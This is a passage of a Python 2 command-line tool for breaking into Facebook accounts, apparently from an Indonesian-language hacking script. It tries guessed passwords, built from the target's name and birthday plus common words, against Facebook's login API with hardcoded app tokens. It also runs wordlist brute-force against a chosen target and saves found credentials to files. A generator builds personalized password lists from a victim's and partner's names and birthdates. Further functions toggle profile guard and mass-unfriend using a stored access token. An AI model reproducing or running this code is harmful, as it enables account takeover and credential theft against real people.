										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
										menu()
									else:
										### Mini ps5
										lahirs = (a['birthday'])
										gaz = lahirs.replace('/', '')
										pz5 = (a['first_name']+gaz)
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										y = json.load(data)
										if 'access_token' in y:
											print "\033[1;91m[+] \033[1;92mFound"
											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
											menu()
										else:
											if 'www.facebook.com' in y["error_msg"]:
												print "\033[1;91m[+] \033[1;92mFound"
												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
												menu()
											else:
												### Mini pz6
												pz6 = ("Bangsat")
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												y = json.load(data)
												if 'access_token' in y:
													print "\033[1;91m[+] \033[1;92mFound"
													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
													menu()
												else:
													if 'www.facebook.com' in y["error_msg"]:
														print "\033[1;91m[+] \033[1;92mFound"
														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
														menu()
													else:
														### Mini pz7
														pz7 = ("sayang")
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														y = json.load(data)
														if 'access_token' in y:
															print "\033[1;91m[+] \033[1;92mFound"
															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
															menu()
														else:
															if 'www.facebook.com' in y["error_msg"]:
																print "\033[1;91m[+] \033[1;92mFound"
																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu()
															else:
																print "\033[1;91m[!] Sorry, failed to open the target password :("
																print "\033[1;91m[!] try it another way."
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu()
															
	except KeyError:
		print "\033[1;91m[!] Terget not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()

#### BRUTE FORCE #####
def brute():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print ("""\x1b[1;92m ╔═══════════════════════════════════════════════╗
\x1b[1;92m ║             \x1b[1;91m❴\x1b[46;3;4;91m 3. TARGET (manual) \x1b[0m\x1b[1;91m❵\x1b[1;92m            ║
\x1b[1;92m ╚═══════════════════════════════════════════════╝""")
	try:
		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
		total = open(passw,"r")
		total = total.readlines()
		print 48*"\033[1;97m═"
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("Brute.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 48*"\033[1;97m═"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("Brutecekpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 48*"\033[1;97m═"
					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
			except requests.exceptions.ConnectionError:
				print"\033[1;91m[!] Connection Error"
				time.sleep(1)
	except IOError:
		print ("\033[1;91m[!] File not found")
		opsi_list()
		
### Tanya Wordlist
def opsi_list():
	why = raw_input("\033[1;91m[?] \033[1;92mCreate wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
	if why =="":
		print "\033[1;91m[!] Wrong"
		opsi_list()
	elif why =="Y" or why =="y":
		wordlist()
	elif why =="N" or why =="n":
		brute()
	else:
		print ("\033[1;91m[!] Wrong")
		opsi_list()
		
def wordlist():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.system('clear')
		print logo
		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
		print 42*"\033[1;97m═"
		a = raw_input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
		file = open(a+".txt", 'w')
		b=raw_input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
		c=raw_input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
		d=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		f=e[0:2]
		g=e[2:4]
		h=e[4:]
		print 42*"\033[1;97m═"
		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
		i=raw_input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
		j=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		l=k[0:2]
		m=k[2:4]
		n=k[4:]
		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
		wg = 0
		while (wg < 100):
			wg = wg + 1
			file.write(a + str(wg) + '\n')
		en = 0
		while (en < 100):
			en = en + 1
			file.write(i + str(en) + '\n')
		word = 0
		while (word < 100):
			word = word + 1
			file.write(d + str(word) + '\n')
		gen = 0
		while (gen < 100):
			gen = gen + 1
			file.write(j + str(gen) + '\n')
		file.close()
		time.sleep(1.5)
		print 42*"\033[1;97m═"
		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		brute()
	except IOError, e:
		print("\033[1;91m[!] Failed")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		masal()

##### PROFIL GUARD #####
def guard():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print "\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo_l4
	print ("""\x1b[1;92m ╔═══════════════════════════════════════════════╗
\x1b[1;92m ║          \x1b[1;91m❴\x1b[46;3;4;91m5. PHOTO PROFILE GUARD \x1b[0m\x1b[1;91m❵\x1b[1;92m            ║
\x1b[1;92m ╠═══════════════════════════════════════════════╝""")
	print "\x1b[96m ╠▶\033[1;93m[ \033[1;97m1 \033[1;93m]\033[1;97m Activate"
	print "\x1b[96m ╠▶\033[1;93m[ \033[1;97m2 \033[1;93m]\033[1;97m Not activate"
	print "\x1b[96m ╠▶\033[1;93m[ \033[1;91m0 \033[1;93m]\033[1;97m Back"
	print "\x1b[96m ║"
	g = raw_input("\033[1;96m ╚═════\033[41;93m❨ \033[3;96mAsim.Ch\033[1;93m ❩\033[0m\033[1;96m════════\033[1;91m▶\033[1;95m ")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
		non = "false"
		gaz(toket, non)
	elif g =="0":
		menu()
	elif g =="":
		guard()
	else:
		print "\x1b[91mSALAH !!!"
		guard()
##1
def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
	
###2
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print (res.text)
	if '"is_shielded":true' in res.text:
		os.system('clear')
		print logo
		print 48* '\x1b[1;96m\xe2\x95\x90'
		print "\x1b[1;93m##\x1b[1;97m Profile GUARD FB " 
		print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate        \033[1;96m[\033[1;92mON\033[1;96m]"
		raw_input("\n\033[1;91m[ \033[1;97mEnter to Back \033[1;91m]")
		menu()
	elif '"is_shielded":false' in res.text:
		os.system('clear')
		print logo
		print 48* '\x1b[1;96m\xe2\x95\x90'
		print "\x1b[1;96m##\x1b[1;97m Profile GUARD FB "
		print "\033[1;91m[\033[1;96m✖️\033[1;91m] \033[1;91mNot Activate        \033[1;96m[\033[1;91mOFF\033[1;96m]"
		raw_input("\n\033[1;91m[ \033[1;97mEnter to Back \033[1;91m]")
		menu()
	else:
		print "\033[1;91m[!] Error"
		keluar()

### UNFRIEND FB ###
def unfriend():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print ("""\x1b[1;92m ╔═══════════════════════════════════════════════╗
\x1b[1;92m ║            \x1b[1;91m❴\x1b[46;3;4;91m6. AUTO UN-FRIENDS ALL \x1b[0m\x1b[1;91m❵\x1b[1;92m            ║
\x1b[1;92m ╚═══════════════════════════════════════════════╝""")
        print 48* '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
        print 48* '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
        print
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[1;97m[\x1b[1;92mRemove\x1b[1;97m] ' + nama + ' => ' + id

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu()
        
if __name__ == '__main__':
	siapa()
